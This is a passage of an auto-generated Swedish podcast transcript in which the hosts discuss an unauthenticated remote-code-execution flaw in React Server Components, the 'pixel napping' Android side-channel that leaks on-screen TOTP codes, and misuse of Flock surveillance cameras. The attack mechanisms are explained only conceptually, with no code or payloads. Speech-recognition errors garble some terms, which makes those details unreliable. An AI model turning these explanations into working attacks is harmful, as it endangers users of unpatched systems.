`1464 00:49:12,520 --> 00:49:14,520`
Ja, exakt. Det är just den här



`1465 00:49:14,520 --> 00:49:16,520`
RCS-historien då.



`1466 00:49:16,520 --> 00:49:18,520`
Och det är ju



`1467 00:49:20,520 --> 00:49:22,520`
Nu ska vi se om jag kan förklara det här på ett bra sätt.



`1468 00:49:22,520 --> 00:49:24,520`
Jag ska gå ner till min lilla



`1469 00:49:24,520 --> 00:49:26,520`
fusklapp här.



`1470 00:49:26,520 --> 00:49:28,520`
Så ska ni få hela grejen.



`1471 00:49:30,520 --> 00:49:32,520`
Det är pausmusik



`1472 00:49:32,520 --> 00:49:34,520`
så ni vet det.



`1473 00:49:34,520 --> 00:49:36,520`
Och på temafrågor.



`1474 00:49:36,520 --> 00:49:38,520`
Hur sker själva kodexekveringen?



`1475 00:49:38,520 --> 00:49:40,520`
Om jag hamnar någonting i en evald



`1476 00:49:40,520 --> 00:49:42,520`
i slutändan eller hur?



`1477 00:49:42,520 --> 00:49:44,520`
Vad är codexecution?



`1478 00:49:44,520 --> 00:49:46,520`
Så idén är då att man har någon



`1479 00:49:46,520 --> 00:49:48,520`
vektor i klientappen, i din webbapp.



`1480 00:49:48,520 --> 00:49:50,520`
Där har vi, där kan vi skapa



`1481 00:49:50,520 --> 00:49:52,520`
någon form av request som då ska



`1482 00:49:52,520 --> 00:49:54,520`
in till din



`1483 00:49:54,520 --> 00:49:56,520`
backendkomponent.



`1484 00:49:56,520 --> 00:49:58,520`
Och där kan du då manipulera



`1485 00:49:58,520 --> 00:50:00,520`
ett sånt här RCS



`1486 00:50:00,520 --> 00:50:02,520`
payload.



`1487 00:50:02,520 --> 00:50:04,520`
Som React på R



`1488 00:50:04,520 --> 00:50:06,520`
SC payload.



`1489 00:50:06,520 --> 00:50:08,520`
Som React på serversidan kommer tolkas som ett anrop



`1490 00:50:08,520 --> 00:50:10,520`
på en intern funktion.



`1491 00:50:10,520 --> 00:50:12,520`
Det vill säga inte en klientside



`1492 00:50:12,520 --> 00:50:14,520`
funktion.



`1493 00:50:14,520 --> 00:50:16,520`
Och det har med någon sån här id



`1494 00:50:16,520 --> 00:50:18,520`
historia att göra.



`1495 00:50:18,520 --> 00:50:20,520`
Så på React på



`1496 00:50:20,520 --> 00:50:22,520`
serversidan tolkas det som ett anrop som är



`1497 00:50:22,520 --> 00:50:24,520`
en intern funktion. Det vill säga inte från



`1498 00:50:24,520 --> 00:50:26,520`
klientsidan av APIet.



`1499 00:50:26,520 --> 00:50:28,520`
Och då validerar inte



`1500 00:50:28,520 --> 00:50:30,520`
React



`1501 00:50:30,520 --> 00:50:32,520`
om funktionen får lov att köras



`1502 00:50:32,520 --> 00:50:34,520`
eller inte köras. För den antar bara att



`1503 00:50:34,520 --> 00:50:36,520`
den kommer ju från insidan.



`1504 00:50:36,520 --> 00:50:38,520`
Från serversidedelen av APIet.



`1505 00:50:38,520 --> 00:50:40,520`
Så då ska vi ju köra den.



`1506 00:50:40,520 --> 00:50:42,520`
Så då tar den emot datat, exekverar det



`1507 00:50:42,520 --> 00:50:44,520`
och resultatet blir att helt utan



`1508 00:50:44,520 --> 00:50:46,520`
auth så kan angriparen då



`1509 00:50:46,520 --> 00:50:48,520`
trigga servercode och i förläggningen



`1510 00:50:48,520 --> 00:50:50,520`
remote code execution.



`1511 00:50:50,520 --> 00:50:52,520`
Och det betyder då att alla då som inte



`1512 00:50:52,520 --> 00:50:54,520`
uppdaterar sin React backend



`1513 00:50:54,520 --> 00:50:56,520`
idag. Och som kör RCS då.



`1514 00:50:56,520 --> 00:50:58,520`
De har ett problem imorgon. Så är det.



`1515 00:50:58,520 --> 00:51:00,520`
Det är alltså inte en bug



`1516 00:51:00,520 --> 00:51:02,520`
i applikationen



`1517 00:51:02,520 --> 00:51:04,520`
per se utan det är en bug i



`1518 00:51:04,520 --> 00:51:06,520`
backenddelen då. Alltså i



`1519 00:51:06,520 --> 00:51:08,520`
själva



`1520 00:51:08,520 --> 00:51:10,520`
React paketet vad man nu ska säga som



`1521 00:51:10,520 --> 00:51:12,520`
hanterar de här server components delarna då.



`1522 00:51:12,520 --> 00:51:14,520`
Men det kräver då att man då typ



`1523 00:51:14,520 --> 00:51:16,520`
använder React server components



`1524 00:51:16,520 --> 00:51:18,520`
annars är man safe. Exakt så.



`1525 00:51:18,520 --> 00:51:20,520`
Så det är ju



`1526 00:51:20,520 --> 00:51:22,520`
en ganska ball grej ändå. Så summeringen är ju



`1527 00:51:22,520 --> 00:51:24,520`
liksom att React teamet har ju



`1528 00:51:24,520 --> 00:51:26,520`
idag då publicerat den här



`1529 00:51:26,520 --> 00:51:28,520`
grejen då. Att



`1530 00:51:28,520 --> 00:51:30,520`
RCS eller



`1531 00:51:30,520 --> 00:51:32,520`
React server components är sårbar liksom.



`1532 00:51:32,520 --> 00:51:34,520`
Och att man



`1533 00:51:34,520 --> 00:51:36,520`
man kan exekvera liksom godtycklig



`1534 00:51:36,520 --> 00:51:38,520`
kod men det är ju det helt oåtatt.



`1535 00:51:38,520 --> 00:51:40,520`
Det är ju det som är lite smådumt då.



`1536 00:51:40,520 --> 00:51:42,520`
Ja.



`1537 00:51:42,520 --> 00:51:44,520`
Det låter sådär. Ja det är



`1538 00:51:44,520 --> 00:51:46,520`
inte kanon då. Så



`1539 00:51:46,520 --> 00:51:48,520`
sårbarheten är liksom



`1540 00:51:48,520 --> 00:51:50,520`
beroende på Reacts hantering



`1541 00:51:50,520 --> 00:51:52,520`
av server actions. Lite



`1542 00:51:52,520 --> 00:51:54,520`
för mycket på klientdatat



`1543 00:51:54,520 --> 00:51:56,520`
som skickades in. React tolkar



`1544 00:51:56,520 --> 00:51:58,520`
då de inkommande RCS paketen



`1545 00:51:58,520 --> 00:52:00,520`
och matchar dem



`1546 00:52:00,520 --> 00:52:02,520`
mot funktioner på serversidan utan validering



`1547 00:52:02,520 --> 00:52:04,520`
egentligen. Och då



`1548 00:52:04,520 --> 00:52:06,520`
ja, påstås det att man ska



`1549 00:52:06,520 --> 00:52:08,520`
kunna anropa interna server funktioner



`1550 00:52:08,520 --> 00:52:10,520`
för React liksom. Att bara exekvera



`1551 00:52:10,520 --> 00:52:12,520`
blindt. Det här är roligt.



`1552 00:52:12,520 --> 00:52:14,520`
Jag googlade lite på detta nu när vi satt



`1553 00:52:14,520 --> 00:52:16,520`
och snackade. Och det är en av de första grejerna som



`1554 00:52:16,520 --> 00:52:18,520`
kommer upp är ett Reddit inlägg



`1555 00:52:18,520 --> 00:52:20,520`
från ett år sedan. Där det



`1556 00:52:20,520 --> 00:52:22,520`
står såhär. Why is nobody talking about the security



`1557 00:52:22,520 --> 00:52:24,520`
implications of React server



`1558 00:52:24,520 --> 00:52:26,520`
components?



`1559 00:52:26,520 --> 00:52:28,520`
Som pratar om just den här delen.



`1560 00:52:28,520 --> 00:52:30,520`
Att vi sammanlänkar frontend och backend



`1561 00:52:30,520 --> 00:52:32,520`
på ett osäkert sätt och



`1562 00:52:32,520 --> 00:52:34,520`
ja. Men för att säga det då. Så min



`1563 00:52:34,520 --> 00:52:36,520`
sida är ju sårbar då. Så felet påverkar



`1564 00:52:36,520 --> 00:52:38,520`
paketet React server dom



`1565 00:52:38,520 --> 00:52:40,520`
alltså domen. I version 19



`1566 00:52:40,520 --> 00:52:42,520`
till, ja det är ju ganska nya då



`1567 00:52:42,520 --> 00:52:44,520`
19, 19.2



`1568 00:52:44,520 --> 00:52:46,520`
Och det är egentligen alla stora



`1569 00:52:46,520 --> 00:52:48,520`
ekosystem runt React också då. Så jag



`1570 00:52:48,520 --> 00:52:50,520`
kör ju Next.js. Just det.



`1571 00:52:50,520 --> 00:52:52,520`
Eller React routers eller olika



`1572 00:52:52,520 --> 00:52:54,520`
bundlers, Parcel, TurboPack



`1573 00:52:54,520 --> 00:52:56,520`
eller vad man nu kan tänkas ha. De



`1574 00:52:56,520 --> 00:52:58,520`
är ju sårbara då. Så 0x4a.se



`1575 00:52:58,520 --> 00:53:00,520`
go fish. Den är ju



`1576 00:53:00,520 --> 00:53:02,520`
den måste jag hem och fixa liksom.



`1577 00:53:02,520 --> 00:53:04,520`
Du får gå över typ och gå. Ja exakt. Vi släpper



`1578 00:53:04,520 --> 00:53:06,520`
det här av oss inte efter du har fixat.



`1579 00:53:06,520 --> 00:53:08,520`
Men inte



`1580 00:53:08,520 --> 00:53:10,520`
efter jag kommer hem.



`1581 00:53:12,520 --> 00:53:14,520`
Men det som är ballar då det är ju att



`1582 00:53:14,520 --> 00:53:16,520`
sårbarheten är upptäckt sen 29 november



`1583 00:53:16,520 --> 00:53:18,520`
och är patchad idag 3 december.



`1584 00:53:18,520 --> 00:53:20,520`
Det är bra jobbat ändå.



`1585 00:53:20,520 --> 00:53:22,520`
Och i morgonbitti när du



`1586 00:53:22,520 --> 00:53:24,520`
går in på din hemsida



`1587 00:53:24,520 --> 00:53:26,520`
så står det Mattias, Mattias, Mattias



`1588 00:53:26,520 --> 00:53:28,520`
över hela din.



`1589 00:53:28,520 --> 00:53:30,520`
Men för att summera det då så React



`1590 00:53:30,520 --> 00:53:32,520`
validerar inte alls dom här olika



`1591 00:53:32,520 --> 00:53:34,520`
moduliderna. Alltså vi har en



`1592 00:53:34,520 --> 00:53:36,520`
slida som är klient i



`1593 00:53:36,520 --> 00:53:38,520`
React och en som är server.



`1594 00:53:38,520 --> 00:53:40,520`
Den validerar varken



`1595 00:53:40,520 --> 00:53:42,520`
moduliderna eller actionid



`1596 00:53:42,520 --> 00:53:44,520`
det vill säga vad det är som får lov



`1597 00:53:44,520 --> 00:53:46,520`
att köras i vilket kontext och vad



`1598 00:53:46,520 --> 00:53:48,520`
det är som ska göras i vilket kontext.



`1599 00:53:48,520 --> 00:53:50,520`
Så att man får lov att köra det om man



`1600 00:53:50,520 --> 00:53:52,520`
når dom. Har dom lagt ut pock på det här eller?



`1601 00:53:52,520 --> 00:53:54,520`
Det kan jag inte tro



`1602 00:53:54,520 --> 00:53:56,520`
att dom har gjort. Men



`1603 00:53:56,520 --> 00:53:58,520`
diffen borde man ju kunna läsa.



`1604 00:53:58,520 --> 00:54:00,520`
Så koden är ju patchad så man



`1605 00:54:00,520 --> 00:54:02,520`
skulle kunna titta på diffen. Ja patchdiffen lär ju komma upp



`1606 00:54:02,520 --> 00:54:04,520`
i logget. Ja det har jag redan fått



`1607 00:54:04,520 --> 00:54:06,520`
en skicka till mig.



`1608 00:54:06,520 --> 00:54:08,520`
Men det är ju roligt också.



`1609 00:54:08,520 --> 00:54:10,520`
RCS transportlaget



`1610 00:54:10,520 --> 00:54:12,520`
tolkar alltså moduler som



`1611 00:54:12,520 --> 00:54:14,520`
genom en intern



`1612 00:54:14,520 --> 00:54:16,520`
action map egentligen och den genereras då



`1613 00:54:16,520 --> 00:54:18,520`
utav en bundler. Det kan vara webpack eller vad vi nu



`1614 00:54:18,520 --> 00:54:20,520`
använder.



`1615 00:54:20,520 --> 00:54:22,520`
Och ja det är ju



`1616 00:54:22,520 --> 00:54:24,520`
där man skulle kunna göra en payload som då



`1617 00:54:24,520 --> 00:54:26,520`
inte kommer valideras och då



`1618 00:54:26,520 --> 00:54:28,520`
ta-da\!



`1619 00:54:28,520 --> 00:54:30,520`
Så hamnar vi där.



`1620 00:54:30,520 --> 00:54:32,520`
Så ja lite ballgrej.



`1621 00:54:32,520 --> 00:54:34,520`
Ja precis och det här är inte vad vi vet



`1622 00:54:34,520 --> 00:54:36,520`
exploited in the wild utan det är



`1623 00:54:36,520 --> 00:54:38,520`
någon researcher som hittade det. Ja exakt



`1624 00:54:38,520 --> 00:54:40,520`
som också då förmodligen har någon koppling till



`1625 00:54:40,520 --> 00:54:42,520`
React så som jag förstod det.



`1626 00:54:42,520 --> 00:54:44,520`
Men kodas React snabbt



`1627 00:54:44,520 --> 00:54:46,520`
fixat. Ja det får man ju säga.



`1628 00:54:46,520 --> 00:54:48,520`
Det var den.



`1629 00:54:48,520 --> 00:54:50,520`
Google



`1630 00:54:50,520 --> 00:54:52,520`
Android. Pixlar



`1631 00:54:52,520 --> 00:54:54,520`
pixelformer. Har försökt och



`1632 00:54:54,520 --> 00:54:56,520`
misslyckats med detta



`1633 00:54:56,520 --> 00:54:58,520`
säkerhetshålet pixel



`1634 00:54:58,520 --> 00:55:00,520`
napping. Ja men det här har jag nog



`1635 00:55:00,520 --> 00:55:02,520`
valt mina år sedan jag pratat om. Det måste ha något



`1636 00:55:02,520 --> 00:55:04,520`
med telefonen att göra när vissa pixlar går och lägger sig



`1637 00:55:04,520 --> 00:55:06,520`
och sover en liten stund. De löste



`1638 00:55:06,520 --> 00:55:08,520`
problemet och hörde av sig till dem



`1639 00:55:08,520 --> 00:55:10,520`
som hade såhär



`1640 00:55:10,520 --> 00:55:12,520`
yes we fixed it och forskarna



`1641 00:55:12,520 --> 00:55:14,520`
tittade på en ny version av



`1642 00:55:14,520 --> 00:55:16,520`
Android. Moddade



`1643 00:55:16,520 --> 00:55:18,520`
sina tackkod litegrann och så



`1644 00:55:18,520 --> 00:55:20,520`
hälsade de av med



`1645 00:55:20,520 --> 00:55:22,520`
ni har inte alls löst någonting.



`1646 00:55:24,520 --> 00:55:26,520`
Pixel napping det handlar ju



`1647 00:55:26,520 --> 00:55:28,520`
just om att du kidnappar pixlar.



`1648 00:55:30,520 --> 00:55:32,520`
Jag har ju faktiskt typ



`1649 00:55:32,520 --> 00:55:34,520`
kodat såhär



`1650 00:55:34,520 --> 00:55:36,520`
typ en tio rader fronten



`1651 00:55:36,520 --> 00:55:38,520`
i Google en gång i tiden.



`1652 00:55:38,520 --> 00:55:40,520`
Och det hade



`1653 00:55:40,520 --> 00:55:42,520`
med att lägga en aktivitet



`1654 00:55:42,520 --> 00:55:44,520`
över den



`1655 00:55:44,520 --> 00:55:46,520`
appen du är inne i just nu.



`1656 00:55:46,520 --> 00:55:48,520`
Vilket



`1657 00:55:48,520 --> 00:55:50,520`
jag gjorde för helt kommersiell



`1658 00:55:50,520 --> 00:55:52,520`
goda liksom



`1659 00:55:52,520 --> 00:55:54,520`
produktutveckling.



`1660 00:55:54,520 --> 00:55:56,520`
Men det är precis



`1661 00:55:56,520 --> 00:55:58,520`
vad pixel napping håller på med.



`1662 00:55:58,520 --> 00:56:00,520`
Så om du till exempel



`1663 00:56:00,520 --> 00:56:02,520`
har uppe din



`1664 00:56:02,520 --> 00:56:04,520`
din sån här



`1665 00:56:04,520 --> 00:56:06,520`
Visa



`1666 00:56:06,520 --> 00:56:08,520`
TimeMotorP koder



`1667 00:56:08,520 --> 00:56:10,520`
eller liknande. Du har någon hemlighet uppe



`1668 00:56:10,520 --> 00:56:12,520`
på din



`1669 00:56:12,520 --> 00:56:14,520`
på din



`1670 00:56:14,520 --> 00:56:16,520`
din skärm.



`1671 00:56:16,520 --> 00:56:18,520`
Och du har godkänt



`1672 00:56:18,520 --> 00:56:20,520`
jag kommer inte ihåg



`1673 00:56:20,520 --> 00:56:22,520`
vilka godkännanden



`1674 00:56:22,520 --> 00:56:24,520`
behöver göra men du



`1675 00:56:24,520 --> 00:56:26,520`
i vart fall så har en



`1676 00:56:26,520 --> 00:56:28,520`
app fått lov att



`1677 00:56:28,520 --> 00:56:30,520`
köra aktiviteter som ligger



`1678 00:56:30,520 --> 00:56:32,520`
över andra appar.



`1679 00:56:32,520 --> 00:56:36,520`
Och olika varianter



`1680 00:56:36,520 --> 00:56:38,520`
av pixel napping attacken



`1681 00:56:38,520 --> 00:56:40,520`
går ut på att du skapar



`1682 00:56:40,520 --> 00:56:42,520`
en overlay



`1683 00:56:42,520 --> 00:56:44,520`
som är



`1684 00:56:44,520 --> 00:56:46,520`
en pixel stor.



`1685 00:56:46,520 --> 00:56:48,520`
Och så lägger



`1686 00:56:48,520 --> 00:56:50,520`
du massvis med



`1687 00:56:50,520 --> 00:56:52,520`
lager i den.



`1688 00:56:52,520 --> 00:56:54,520`
Och alla de har lite olika



`1689 00:56:54,520 --> 00:56:56,520`
blöreffekt.



`1690 00:56:58,520 --> 00:57:00,520`
Det visar sig då att



`1691 00:57:00,520 --> 00:57:02,520`
när du räknar ut



`1692 00:57:02,520 --> 00:57:04,520`
hur mycket någonting ska



`1693 00:57:04,520 --> 00:57:06,520`
vara blörat



`1694 00:57:06,520 --> 00:57:08,520`
så går det antingen genom



`1695 00:57:08,520 --> 00:57:10,520`
en quick path eller en slow path



`1696 00:57:10,520 --> 00:57:12,520`
i grafik API.



`1697 00:57:12,520 --> 00:57:14,520`
Jag läste bara här snabbt



`1698 00:57:14,520 --> 00:57:16,520`
att de använder sig av någon



`1699 00:57:16,520 --> 00:57:18,520`
hårdvaruserad



`1700 00:57:18,520 --> 00:57:20,520`
sidechannel.



`1701 00:57:20,520 --> 00:57:22,520`
Men det låter ju som att det



`1702 00:57:22,520 --> 00:57:24,520`
snarare är det API



`1703 00:57:24,520 --> 00:57:26,520`
då kanske de syftar på.



`1704 00:57:26,520 --> 00:57:28,520`
Det är möjligt att det är hårdvara



`1705 00:57:28,520 --> 00:57:30,520`
i botten men om du tänker dig



`1706 00:57:30,520 --> 00:57:32,520`
upplevelsen från API mässigt



`1707 00:57:32,520 --> 00:57:34,520`
så är det



`1708 00:57:34,520 --> 00:57:36,520`
du skapar en pixel



`1709 00:57:36,520 --> 00:57:38,520`
den pixeln har massvis med blöreffekter



`1710 00:57:38,520 --> 00:57:40,520`
på sig och



`1711 00:57:40,520 --> 00:57:42,520`
den tar hänsyn till



`1712 00:57:42,520 --> 00:57:44,520`
hur pixlarna runt omkring ser ut.



`1713 00:57:44,520 --> 00:57:46,520`
Så om du har



`1714 00:57:46,520 --> 00:57:48,520`
en helt vit skärm



`1715 00:57:48,520 --> 00:57:50,520`
där det enda som finns på skärmen



`1716 00:57:50,520 --> 00:57:52,520`
är att på en liten bit av den



`1717 00:57:52,520 --> 00:57:54,520`
så står



`1718 00:57:54,520 --> 00:57:56,520`
din TOTP



`1719 00:57:56,520 --> 00:57:58,520`
challenge kod.



`1720 00:57:58,520 --> 00:58:00,520`
Så länge



`1721 00:58:00,520 --> 00:58:02,520`
som du frågar



`1722 00:58:02,520 --> 00:58:04,520`
vad är värde



`1723 00:58:04,520 --> 00:58:06,520`
eller beden



`1724 00:58:06,520 --> 00:58:08,520`
när den drev den här pixeln



`1725 00:58:08,520 --> 00:58:10,520`
och du är på en yta



`1726 00:58:10,520 --> 00:58:12,520`
där det bara är vitt omkring



`1727 00:58:12,520 --> 00:58:14,520`
då är det klart instant.



`1728 00:58:14,520 --> 00:58:16,520`
Den behövde inte köra



`1729 00:58:16,520 --> 00:58:18,520`
grafikooperationerna



`1730 00:58:18,520 --> 00:58:20,520`
den kunde förstå



`1731 00:58:20,520 --> 00:58:22,520`
att den är inne i faspa.



`1732 00:58:22,520 --> 00:58:24,520`
Tar det lite längre tid så ligger det



`1733 00:58:24,520 --> 00:58:26,520`
bredvid någonting



`1734 00:58:26,520 --> 00:58:28,520`
då kan du mäta vad det är som är där.



`1735 00:58:28,520 --> 00:58:30,520`
Så då bara du sveper med pixeln



`1736 00:58:30,520 --> 00:58:32,520`
och efter en stund



`1737 00:58:32,520 --> 00:58:34,520`
så har algoritmen



`1738 00:58:34,520 --> 00:58:36,520`
typ en pixelsida



`1739 00:58:36,520 --> 00:58:38,520`
med var finns det



`1740 00:58:38,520 --> 00:58:40,520`
var finns det



`1741 00:58:40,520 --> 00:58:42,520`
var finns det text, var finns det inte text.



`1742 00:58:42,520 --> 00:58:44,520`
Den gör lite som



`1743 00:58:44,520 --> 00:58:46,520`
den här gamla grejen man gjorde när man var liten



`1744 00:58:46,520 --> 00:58:48,520`
eller såg att detektiver gör



`1745 00:58:48,520 --> 00:58:50,520`
ifall de har skrivit någonting i block



`1746 00:58:50,520 --> 00:58:52,520`
och tagit bort pappret



`1747 00:58:52,520 --> 00:58:54,520`
så drar man pennan över



`1748 00:58:54,520 --> 00:58:56,520`
och så ser man vad de har skrivit.



`1749 00:58:56,520 --> 00:58:58,520`
Så jag funderar på om man lär säkra



`1750 00:58:58,520 --> 00:59:00,520`
hus och skräp på sin skärm



`1751 00:59:00,520 --> 00:59:02,520`
och liksom fladdra



`1752 00:59:02,520 --> 00:59:04,520`
skräp över skärmen så att det blir



`1753 00:59:04,520 --> 00:59:06,520`
Jag tror att många saker



`1754 00:59:06,520 --> 00:59:08,520`
typ BankID och sådär inte tillåter



`1755 00:59:08,520 --> 00:59:10,520`
att andra appar kan göra den typen



`1756 00:59:10,520 --> 00:59:12,520`
av grejer samtidigt.



`1757 00:59:12,520 --> 00:59:14,520`
De tillåter inte att du tar screenshot



`1758 00:59:14,520 --> 00:59:16,520`
och sådana grejer vet jag bland annat.



`1759 00:59:16,520 --> 00:59:18,520`
Jag vet inte



`1760 00:59:18,520 --> 00:59:20,520`
ifall de just har skydd mot



`1761 00:59:20,520 --> 00:59:22,520`
den här specifika tanken. Det beror nog på



`1762 00:59:22,520 --> 00:59:24,520`
vad det är för API som Google tillåter.



`1763 00:59:24,520 --> 00:59:26,520`
Vad var det för rättigheter den här appen



`1764 00:59:26,520 --> 00:59:28,520`
behövde för att göra detta?



`1765 00:59:28,520 --> 00:59:30,520`
Det minns jag inte riktigt



`1766 00:59:30,520 --> 00:59:32,520`
men



`1767 00:59:32,520 --> 00:59:34,520`
jag kodade ju



`1768 00:59:34,520 --> 00:59:36,520`
på någon sorts säkerhetsapp



`1769 00:59:36,520 --> 00:59:38,520`
där det kom upp lite display



`1770 00:59:38,520 --> 00:59:40,520`
om vad som skulle göras och sådant



`1771 00:59:40,520 --> 00:59:42,520`
och den kunde ju triggas



`1772 00:59:42,520 --> 00:59:44,520`
från olika appar man var i.



`1773 00:59:46,520 --> 00:59:48,520`
Men du måste ju



`1774 00:59:48,520 --> 00:59:50,520`
få lov att lägga aktiviteter över



`1775 00:59:50,520 --> 00:59:52,520`
den nuvarande skärmen.



`1776 00:59:56,520 --> 00:59:58,520`
För jag vet inte



`1777 00:59:58,520 --> 01:00:00,520`
jag kan inte erinne mig



`1778 01:00:00,520 --> 01:00:02,520`
att någon iPhone



`1779 01:00:02,520 --> 01:00:04,520`
har förmågan att lägga sig över



`1780 01:00:04,520 --> 01:00:06,520`
den annan.



`1781 01:00:06,520 --> 01:00:08,520`
Vissa systemnotifieringar



`1782 01:00:08,520 --> 01:00:10,520`
och sådant kan ju komma över.



`1783 01:00:10,520 --> 01:00:12,520`
Jag minns till exempel de här



`1784 01:00:12,520 --> 01:00:14,520`
Polackerna som på



`1785 01:00:14,520 --> 01:00:16,520`
BankID-grejen.



`1786 01:00:16,520 --> 01:00:18,520`
Ja, precis deras variant på BankID.



`1787 01:00:18,520 --> 01:00:20,520`
Det var ju typ samma sak de gjorde



`1788 01:00:20,520 --> 01:00:22,520`
att de kunde lägga



`1789 01:00:22,520 --> 01:00:24,520`
ett annat foto över det nuvarande fotot



`1790 01:00:24,520 --> 01:00:26,520`
medan du var inne i appen och sådant.



`1791 01:00:26,520 --> 01:00:28,520`
Och det är ju liksom...



`1792 01:00:28,520 --> 01:00:30,520`
lite samma grej som man använder här



`1793 01:00:30,520 --> 01:00:32,520`
att man kan överlagra



`1794 01:00:32,520 --> 01:00:34,520`
en nuvarande app liksom och så.



`1795 01:00:34,520 --> 01:00:36,520`
Men det är lite coolt



`1796 01:00:36,520 --> 01:00:38,520`
att liksom



`1797 01:00:38,520 --> 01:00:40,520`
ett sidoläckage i



`1798 01:00:40,520 --> 01:00:42,520`
grafik-API



`1799 01:00:42,520 --> 01:00:44,520`
läcker bilden



`1800 01:00:44,520 --> 01:00:46,520`
i en annan app liksom.



`1801 01:00:46,520 --> 01:00:48,520`
Var det liksom, kunde de få...



`1802 01:00:48,520 --> 01:00:50,520`
Var det pixel-perfect?



`1803 01:00:50,520 --> 01:00:52,520`
Kunde de få loss all data?



`1804 01:00:52,520 --> 01:00:54,520`
Eller var det lite blurry?



`1805 01:00:54,520 --> 01:00:56,520`
Nej, alltså



`1806 01:00:56,520 --> 01:00:58,520`
vad de hade som...



`1807 01:00:58,520 --> 01:01:00,520`
vad de hade som proof of concept



`1808 01:01:00,520 --> 01:01:02,520`
var ju att plocka ut



`1809 01:01:02,520 --> 01:01:04,520`
den koden som stod i



`1810 01:01:04,520 --> 01:01:06,520`
olika OTP-applikationer



`1811 01:01:06,520 --> 01:01:08,520`
och sådant. Så att de



`1812 01:01:08,520 --> 01:01:10,520`
deriverade ju fram



`1813 01:01:10,520 --> 01:01:12,520`
text från den. Jag vet inte



`1814 01:01:12,520 --> 01:01:14,520`
riktigt om du till exempel



`1815 01:01:14,520 --> 01:01:16,520`
kan få ut olika färg och sådant.



`1816 01:01:16,520 --> 01:01:18,520`
Det är jag lite osäker på liksom.



`1817 01:01:18,520 --> 01:01:20,520`
Men vad de ville



`1818 01:01:20,520 --> 01:01:22,520`
var ju att stjäla säkerhetsinformation.



`1819 01:01:24,520 --> 01:01:26,520`
Gissningsvis



`1820 01:01:26,520 --> 01:01:28,520`
så kan du ju inte få ut en pixel-perfect



`1821 01:01:28,520 --> 01:01:30,520`
eftersom att



`1822 01:01:30,520 --> 01:01:32,520`
du reagerar ju på om det finns



`1823 01:01:32,520 --> 01:01:34,520`
något bredvid och så. Så att du borde ju



`1824 01:01:34,520 --> 01:01:36,520`
du borde ju...



`1825 01:01:36,520 --> 01:01:38,520`
Jag vet inte om det är typ en sexpixel



`1826 01:01:38,520 --> 01:01:40,520`
eller någonting som ingår i när du tittar



`1827 01:01:40,520 --> 01:01:42,520`
för att räkna ut en pixel.



`1828 01:01:42,520 --> 01:01:44,520`
Så du borde ju åtminstone



`1829 01:01:44,520 --> 01:01:46,520`
kraftigt sänka uppläsningen



`1830 01:01:46,520 --> 01:01:48,520`
på den deriverade bilden



`1831 01:01:48,520 --> 01:01:50,520`
kontra originalbilden.



`1832 01:01:50,520 --> 01:01:52,520`
Jag tänkte vad man kan liksom...



`1833 01:01:52,520 --> 01:01:54,520`
För det har vi ju sett sådana här blurry decoders



`1834 01:01:54,520 --> 01:01:56,520`
förut. Att man på samma sätt här kan



`1835 01:01:56,520 --> 01:01:58,520`
med hjälp utav tillräckligt många sampelpunkter



`1836 01:01:58,520 --> 01:02:00,520`
bara, så kan man liksom få tillbaks



`1837 01:02:00,520 --> 01:02:02,520`
med hög sannolikhet hur



`1838 01:02:02,520 --> 01:02:04,520`
den ursprungliga bilden ska ut.



`1839 01:02:04,520 --> 01:02:06,520`
Pixel för pixel.



`1840 01:02:06,520 --> 01:02:08,520`
Jag tänker, jag menar har du en hög



`1841 01:02:08,520 --> 01:02:10,520`
upplösskärm som många dyra telefoner har



`1842 01:02:10,520 --> 01:02:12,520`
så är det väl...



`1843 01:02:12,520 --> 01:02:14,520`
Du måste ju ha jätte...



`1844 01:02:14,520 --> 01:02:16,520`
Vad sa du?



`1845 01:02:16,520 --> 01:02:18,520`
Jag hörde helt fel\!



`1846 01:02:18,520 --> 01:02:20,520`
Dots per



`1847 01:02:20,520 --> 01:02:22,520`
inch.



`1848 01:02:22,520 --> 01:02:24,520`
Du har ett helt annat ljud



`1849 01:02:24,520 --> 01:02:26,520`
som du.



`1850 01:02:26,520 --> 01:02:28,520`
Dags att gå vidare.



`1851 01:02:28,520 --> 01:02:30,520`
Vissa arkings.



`1852 01:02:30,520 --> 01:02:32,520`
Okej, jag vet fortfarande inte



`1853 01:02:32,520 --> 01:02:34,520`
var du hörde, men okej.



`1854 01:02:34,520 --> 01:02:36,520`
Flock.



`1855 01:02:36,520 --> 01:02:38,520`
Har ni hört talas om dem?



`1856 01:02:38,520 --> 01:02:40,520`
Det är samlingsnamn för



`1857 01:02:40,520 --> 01:02:42,520`
vissa djur.



`1858 01:02:42,520 --> 01:02:44,520`
Jag tänkte



`1859 01:02:44,520 --> 01:02:46,520`
USA och



`1860 01:02:46,520 --> 01:02:48,520`
vissa kameror.



`1861 01:02:48,520 --> 01:02:50,520`
Ja, men vänta.



`1862 01:02:50,520 --> 01:02:52,520`
Det är en övervakningsgrej.



`1863 01:02:52,520 --> 01:02:54,520`
Nej.



`1864 01:02:54,520 --> 01:02:56,520`
Det finns...



`1865 01:02:56,520 --> 01:02:58,520`
De är omtalade i olika sammanhang



`1866 01:02:58,520 --> 01:03:00,520`
och ofta inte i så goda



`1867 01:03:00,520 --> 01:03:02,520`
sammanhang.



`1868 01:03:02,520 --> 01:03:04,520`
Det är nog minst så att en massa



`1869 01:03:04,520 --> 01:03:06,520`
städer och polismyndigheter



`1870 01:03:06,520 --> 01:03:08,520`
och annat



`1871 01:03:08,520 --> 01:03:10,520`
köper flockkameror



`1872 01:03:10,520 --> 01:03:12,520`
och sätter upp dem då.



`1873 01:03:12,520 --> 01:03:14,520`
Och



`1874 01:03:14,520 --> 01:03:16,520`
det finns många fall på där man använder



`1875 01:03:16,520 --> 01:03:18,520`
det här ganska dåligt, men



`1876 01:03:20,520 --> 01:03:22,520`
bland annat så



`1877 01:03:22,520 --> 01:03:24,520`
har ju poliser



`1878 01:03:24,520 --> 01:03:26,520`
ståkat kvinnor via det här och



`1879 01:03:26,520 --> 01:03:28,520`
liksom...



`1880 01:03:28,520 --> 01:03:30,520`
Och i



`1881 01:03:30,520 --> 01:03:32,520`
typ sådana här delstater



`1882 01:03:32,520 --> 01:03:34,520`
där de inte



`1883 01:03:34,520 --> 01:03:36,520`
där de inte tillåter



`1884 01:03:36,520 --> 01:03:38,520`
abort



`1885 01:03:38,520 --> 01:03:40,520`
så har de ju



`1886 01:03:40,520 --> 01:03:42,520`
förföljt kvinnor som har lämnat delstaten



`1887 01:03:42,520 --> 01:03:44,520`
och så istället för att skriva



`1888 01:03:44,520 --> 01:03:46,520`
att de utreder



`1889 01:03:46,520 --> 01:03:48,520`
